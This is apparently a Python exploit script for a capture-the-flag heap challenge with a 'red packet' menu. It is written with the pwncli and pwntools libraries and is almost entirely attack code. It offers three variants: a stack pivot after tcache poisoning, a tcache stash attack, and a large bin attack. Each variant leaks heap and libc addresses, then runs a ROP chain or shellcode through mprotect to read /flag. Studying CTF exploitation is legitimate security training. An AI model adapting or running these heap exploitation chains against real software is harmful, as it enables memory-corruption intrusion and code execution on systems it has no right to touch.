#!/usr/bin/python3
from pwncli import *
cli_script()

libc:ELF = gift['libc']

idx_size = {1:0x10, 2:0xf0, 3:0x300, 4:0x400}

context.buffer_size=0x1000

def get(p:tube, idx, sizeidx, content=None):
    if content is None:
        content = "a\n"
    p.sendlineafter("Your input: ", "1")
    p.sendlineafter("Please input the red packet idx: ", str(idx))
    p.sendlineafter("How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ", str(sizeidx))
    p.sendafter("Please input content: ", content)


def throw(p:tube, idx):
    p.sendlineafter("Your input: ", "2")
    p.sendlineafter("Please input the red packet idx: ", str(idx))


# only one time
def change(p:tube, idx, content):
    p.sendlineafter("Your input: ", "3")
    p.sendlineafter("Please input the red packet idx: ", str(idx))
    p.recvuntil("Please input content: ")
    p.send(content)


def watch(p:tube, idx):
    p.sendlineafter("Your input: ", "4")
    p.sendlineafter("Please input the red packet idx: ", str(idx))
    msg = p.recvline()
    info("recv msg:{}".format(msg))
    return u64(msg[:-1].ljust(8, b"\x00"))


def stack_overflow(p:tube, content):
    p.sendlineafter("Your input: ", "666")
    p.sendafter("What do you want to say?", content)


def exit_p(p:tube):
    p.sendlineafter("Your input: ", "5")


def get_rop(libc_base_addr, fill_chunk_addr):
    rax_ret = libc_base_addr + 0x47cf8
    rdi_ret = libc_base_addr + 0x26542
    rsi_ret = libc_base_addr + 0x26f9e
    rdx_ret = libc_base_addr + 0x12bda6
    sys_ret = libc_base_addr + 0xcf6c5
    rop = flat(rdi_ret, fill_chunk_addr,
                rsi_ret, 0,
                rax_ret, 2,
                sys_ret,
                rdi_ret, 3,
                rsi_ret, fill_chunk_addr+0x350,
                rdx_ret, 0x30,
                rax_ret, 0,
                sys_ret,
                rdi_ret, 1,
                rsi_ret, fill_chunk_addr+0x350,
                rdx_ret, 0x30,
                rax_ret, 1,
                sys_ret)
    return rop


# use stack pivot
def attack(p:tube):
    # leak heap address
    get(p, 5, 4)
    leak_heap_addr = watch(p, 2)
    log_address("leak_heap_addr", leak_heap_addr)
    heap_base_addr = leak_heap_addr - 0x1270

    # leak libc addr
    leak_libc_addr = watch(p, 3)
    libc_base_addr = leak_libc_addr - 0x2199f0
    libc.address = libc_base_addr
    log_address("libc_base_addr",libc_base_addr)

    # to free chunk 0x1010
    victim_address = heap_base_addr + 0x260

    change(p, 2, p64(victim_address))
    throw(p, 5)

    # to fill 0x800 to 0x7fffffffffff
    get(p, 0, 2)
    get(p, 1, 4)

    # rop payload
    fill_chunk_addr = heap_base_addr + 0x770
    rop = get_rop(libc_base_addr, fill_chunk_addr)

    payload = flat({
        0:"/flag".ljust(8, "\x00"),
        0x18: rop,
        0x2e8: 0, 
        0x2f0: 0x7fffffffffff,
        0x2f8: 0
    }, filler="\x00")

    get(p, 3, 4, payload)

    # stack pivot and exec rop to get flag
    payload = flat({
        0x80:fill_chunk_addr+0x10,
        0x88:libc_base_addr+0x58373
    }, filler="\x00", length=0x90)

    stack_overflow(p, payload)
    p.interactive()


# use tcache stash attack
def attack2(p:tube):
    chunk_type = 4

    # leak addr
    for i in range(8):
        get(p, i, chunk_type)
    get(p, 8, 1) # gap
    get(p, 9, chunk_type)
    get(p, 10, 1) # gap

    # leak heap addr
    throw(p, 0)
    throw(p, 1)
    leak_heap_addr = watch(p, 1)
    heap_base_addr = leak_heap_addr - 0x1270
    log_address("heap_base_addr", heap_base_addr)

    # fill 0x400 7
    for i in range(2, 7):
        throw(p, i)

    # fill 0x100 6
    for i in range(6):
        get(p, i, 2)
        throw(p, i)
    
    # leak libc addr
    throw(p, 7)
    leak_libc_addr = watch(p, 7)
    libc_base_addr = leak_libc_addr - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # split chunk
    get(p, 0, 3)

    throw(p, 9)
    get(p, 1, 3)

    # put 0x100 to smallbin
    get(p, 2, 4)

    # change smallbin 2 's bk to 'target addr - 0x10'
    fill_chunk_addr = 0x3310 + heap_base_addr
    rop = get_rop(libc_base_addr, fill_chunk_addr)

    payload = flat({
        0:"/flag".ljust(8, "\x00"),
        0x18: rop,
        0x300:0,
        0x308:0x101,
        0x310:heap_base_addr+0x31e0,
        0x318:heap_base_addr+0xa50
    }, filler='\x00')

    change(p, 9, payload)

    # stash attack
    get(p, 3, 2)

    # stack pivot and exec rop to get flag
    payload = flat({
        0x80:fill_chunk_addr+0x10,
        0x88:libc_base_addr+0x58373
    }, filler="\x00", length=0x90)

    stack_overflow(p, payload)

    p.interactive()


# use large bin attack
def attack3(p:tube):
    chunk_type = 4

    # leak addr
    for i in range(8):
        get(p, i, chunk_type)
    get(p, 8, 1) # gap
    get(p, 9, chunk_type)
    get(p, 10, 1) # gap
    get(p, 11, chunk_type)
    get(p, 12, 1) # gap

    # leak heap addr
    throw(p, 0)
    throw(p, 1)
    leak_heap_addr = watch(p, 1)
    heap_base_addr = leak_heap_addr - 0x1270
    log_address("heap_base_addr", heap_base_addr)

    # fill 0x400 7
    for i in range(2, 7):
        throw(p, i)
    
    # leak libc addr
    throw(p, 7)
    leak_libc_addr = watch(p, 7)
    libc_base_addr = leak_libc_addr - 0x1e4ca0
    libc.address = libc_base_addr
    log_address("libc_base_addr", libc_base_addr)

    # to get a large bin
    throw(p, 9)
    fake_fd = heap_base_addr + 0x3310-0x10
    target_write_addr = heap_base_addr + 0xa60+1
    payload = flat(0, target_write_addr - 0x10)
    get(p, 0, 1, payload)

    throw(p, 11)
    
    # large bin attack
    change(p, 7, p64(fake_fd))
    

    fill_chunk_addr = 0x3330 + heap_base_addr
    rdi_ret = libc_base_addr + 0x26542
    rsi_ret = libc_base_addr + 0x26f9e
    rdx_ret = libc_base_addr + 0x12bda6
    rsp_ret = libc_base_addr + 0x30e4e
    retf = libc_base_addr + 0x12c351

    shellcode_addr = fill_chunk_addr+0x100

    rop = flat([
        rdi_ret, heap_base_addr,
        rsi_ret, 0x4000,
        rdx_ret, 7,
        libc.sym['mprotect'],
        shellcode_addr,
    ])

    shellcode = asm(shellcraft.cat("/flag"))

    payload = flat({
        0:"input:\n".ljust(8, "\x00"),
        0x18: rop,
        0x100: shellcode
    }, filler='\x00', length=0x250)

    get(p, 1, 3, payload)

    # stack pivot and exec rop to get flag
    payload = flat({
        0x80:fill_chunk_addr+0x10,
        0x88:libc_base_addr+0x58373
    }, filler="\x00", length=0x90)

    stack_overflow(p, payload)

    p.interactive()


attack3(gift['io'])